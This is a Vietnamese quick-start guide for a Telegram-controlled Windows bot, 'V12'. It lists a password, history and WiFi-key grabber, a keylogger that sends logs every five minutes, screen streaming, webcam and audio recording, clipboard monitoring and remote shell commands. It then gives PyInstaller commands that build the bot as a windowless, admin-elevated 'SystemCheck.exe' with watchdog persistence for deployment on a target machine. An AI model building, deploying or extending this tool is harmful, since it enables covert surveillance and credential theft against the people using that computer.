# 🚀 QUICK START - V12

> **Developer:** TsByin  
> **Version:** 12.0

---

## 5 Bước Nhanh

### 1️⃣ Cài Đặt Thư Viện

```bash
pip install -r requirements.txt
```

### 2️⃣ Cấu Hình .env

Tạo file `.env` với nội dung:

```env
API_TOKEN=YOUR_TELEGRAM_TOKEN_HERE
ADMIN_ID=YOUR_ADMIN_ID_HERE

# Remote Update qua NAS WebDAV (tùy chọn)
NAS_WEBDAV_URL=https://nas.example.com:5006/Bot_Updates/SystemCheck.exe
NAS_WEBDAV_USER=username
NAS_WEBDAV_PASS=password
```

**Lưu file.**

### 3️⃣ Kiểm Tra Config

```bash
python -c "from config import API_TOKEN, ADMIN_ID; print('✅ Config OK')"
```

### 4️⃣ Chạy Bot

```bash
python V12.py
```


**Thành công sẽ thấy:**
```
🟢 Bot Started. ID: YOUR_ID
🟢 SYSTEM ONLINE | Host: [tên máy]
```

### 5️⃣ Test Telegram

Gửi `/start` hoặc `/menu` → Bot sẽ hiển thị menu

---

## Lệnh Slash Đầy Đủ (V12 — 26 lệnh)

| Lệnh | Mô Tả |
|------|-------|
| `/start` `/menu` | Mở menu điều khiển |
| `/help` | Xem hướng dẫn |
| `/status` | Dashboard hệ thống (CPU/RAM/Disk/Battery/Net) |
| `/stats` | Thống kê bot |
| `/disk` | Chi tiết ổ đĩa & pin |
| `/ps [filter]` | Danh sách tiến trình (tùy chọn lọc theo tên) |
| `/net` | Snapshot mạng (interfaces, IO, TCP connections) |
| `/events` | 10 Windows System Event Log mới nhất |
| `/stream [N]` | Phát màn hình mỗi N giây (default 5s) |
| `/stream stop` | Dừng stream |
| `/record [N]` | Quay màn hình N giây, xuất MP4 |
| `/audio [N]` | Ghi âm N giây |
| `/cmd <lệnh>` | Chạy lệnh shell (whitelist) |
| `/cmdlist` | Xem danh sách lệnh shell được phép |
| `/msg <nội dung>` | Hiển thị thông báo popup |
| `/say [--rate N] [--voice f\|m] <text>` | TTS phát giọng nói |
| `/block app\|site <tên…>` | Chặn nhiều app/web |
| `/unblock app\|site <tên…>` | Gỡ chặn app/web |
| `/kill <pid>` | Kết thúc tiến trình |
| `/clipmon` | Toggle clipboard monitor tự động |
| `/reload` | Tải lại cấu hình từ `.env` (hot-reload) |
| `/restart` | Khởi động lại bot ngay (watchdog tự restart tiến trình) |
| `/update [url]` | Tải EXE mới từ NAS/URL và swap (chỉ EXE mode) |
| `/rollback` | Khôi phục EXE cũ sau khi update |
| `/cancel` | Hủy thao tác đang chờ (file upload) |
| `/stop` | Tắt bot hoàn toàn (không tự restart) |
| `/auditlog [N]` | Xem N dòng audit log gần nhất |

---

## Build EXE

```bash
# Build main bot
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" ^
  --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=comtypes.client ^
  V12.py

# Build watchdog (tự restart khi crash)
pyinstaller --onefile --noconsole --icon=icon.ico --name="watchdog" watchdog.py
```

Output:
- `dist/SystemCheck.exe` (~76 MB)
- `dist/watchdog.exe` (~8-12 MB)

**Deploy:** Copy cả 2 EXE + `.env` vào máy đích. Chạy `watchdog.exe` as Administrator — nó sẽ tự launch `SystemCheck.exe` và giám sát.

**Xem:** `BUILD_EXE.md` để chi tiết đầy đủ + hướng dẫn Remote Update qua NAS.

---

## Troubleshooting

**Bot không online?**
- Kiểm tra .env có API_TOKEN hợp lệ
- Chạy lại: `python V12.py`

**Import error?**
- Reinstall: `pip install -r requirements.txt`

**Không nhận lệnh?**
- Kiểm tra ADMIN_ID đúng với ID Telegram
- Gửi `/start` lại

---

**Tài liệu đầy đủ:** `README.md`  
**Kiến trúc chi tiết:** `ARCHITECTURE.md`

---

## **CÓ GÌ THAY ĐỔI? (V11 → V12)**

| Tính Năng | V11 | V12 |
|-----------|-----|-----|
| **Token** | Hardcode | `.env` ✅ |
| **Logging** | silent | chi tiết ✅ |
| **Grabber** | 1 worker | 4 worker ✅ |
| **Tốc độ** | ~20s | ~8s ✅ |
| **Modular** | 1 file | 9 file ✅ |
| **Video** | AVI 10s cố định | **MP4**, thời lượng tùy chỉnh ✅ |
| **Keylogger** | ❌ | window-aware, tự gửi 5 phút ✅ |
| **Watchdog** | ❌ | tự khởi động lại nếu crash ✅ |
| **State persist** | ❌ mất sau restart | lưu `settings.json` ✅ |
| **Audit log** | ❌ | ghi `audit.log` mọi lệnh ✅ |
| **/status** | đơn giản | dashboard đầy đủ ✅ |
| **`/disk`** | ❌ | chi tiết từng ổ + pin ✅ |
| **`/ps filter`** | chỉ top 15 | lọc theo tên, top 20 ✅ |
| **`/net`** | ❌ | interfaces + IO + TCP ✅ |
| **`/events`** | ❌ | Windows Event Log ✅ |
| **Clipboard monitor** | thủ công | tự động theo dõi thay đổi ✅ |
| **`/stream`** | ❌ | remote desktop lite ✅ |
| **`/reload`** | ❌ | hot-reload `.env` ✅ |
| **Bot commands** | ❌ | tự đăng ký 26 lệnh slash ✅ |
| **Remote Update** | ❌ | /update từ NAS/URL, swap EXE + rollback ✅ |
| **watchdog.exe** | ❌ | tự build + deploy riêng, auto-restart ✅ |
| **Thread pool** | bare Thread/command | ThreadPoolExecutor(12) ✅ |
| **Monitor perf** | blocking cpu_percent | non-blocking + dedicated threads ✅ |

---

## **STRUCTURE V12**

```
V12/
├── .env                  ← Cấu hình bí mật (REQUIRED)
├── config.py             ← Hằng số, logging, browser paths
├── utils.py              ← Tiện ích hệ thống, audit log, settings
├── grabber.py            ← Trích xuất password/history/WiFi
├── media.py              ← Screenshot, webcam, audio, MP4
├── monitor.py            ← Daemon giám sát + BotStats
├── watchdog.py           ← Tự khởi động lại khi crash (NEW)
├── keylogger.py          ← Keylogger kiểm soát trẻ em (NEW)
├── V12.py                ← Main bot entry (~1350+ dòng)
├── requirements.txt      ← Đầy đủ dependencies
├── settings.json         ← State persist (tự tạo)
├── audit.log             ← Audit trail (tự tạo)
└── blocked.json          ← Danh sách chặn (tự tạo)
```

---

## **TROUBLESHOOT NHANH**

**❌ ModuleNotFoundError**
```powershell
pip install -r requirements.txt --force-reinstall
```

**❌ KeyError: 'API_TOKEN'**

PowerShell:
```powershell
# Check .env exists
Test-Path .env
# Show contents
Get-Content .env
```

CMD:
```cmd
:: Check .env exists
if exist .env (echo .env exists) else (echo .env missing)
:: Show contents
type .env
```

Unix / Git Bash:
```bash
# Check .env exists
[ -f .env ] && echo ".env exists" || echo ".env missing"
# Show contents
cat .env
```

**❌ Bot không connect**
```powershell
# Verify token
python -c "from config import API_TOKEN; print(API_TOKEN[:20] + '...')"
```

---

## **NEXT STEPS**

1. ✅ Cài .env + modules
2. ✅ Chạy V12.py
3. ✅ Test lệnh `/menu` trên Telegram
4. 📝 Xem `BUILD_EXE.md` cho hướng dẫn build
5. 🔨 Build EXE:

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
```---

**🎉 XONG! Bot tối ưu đã sẵn sàng!**
